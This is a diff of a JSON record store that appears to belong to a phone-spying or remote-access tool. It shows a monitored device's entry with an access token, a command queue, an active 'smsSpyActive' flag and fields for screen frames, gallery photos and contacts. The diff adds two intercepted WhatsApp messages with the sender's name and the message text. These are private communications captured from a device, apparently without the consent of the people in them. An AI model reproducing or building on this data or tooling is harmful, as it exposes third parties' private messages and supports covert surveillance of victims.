@@ -7889,7 +7889,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777189180566,
+    "lastSeen": 1777189210588,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -7904,7 +7904,24 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Senam Rappocini",
+        "content": "~ Dindaa: Ada tanteku begitu jg gatal 1 rmh",
+        "time": "26/04 15:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777189181816
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Senam Rappocini: ~ Dindaa",
+        "content": "Ada tanteku begitu jg gatal 1 rmh",
+        "time": "26/04 15:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777189181589
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
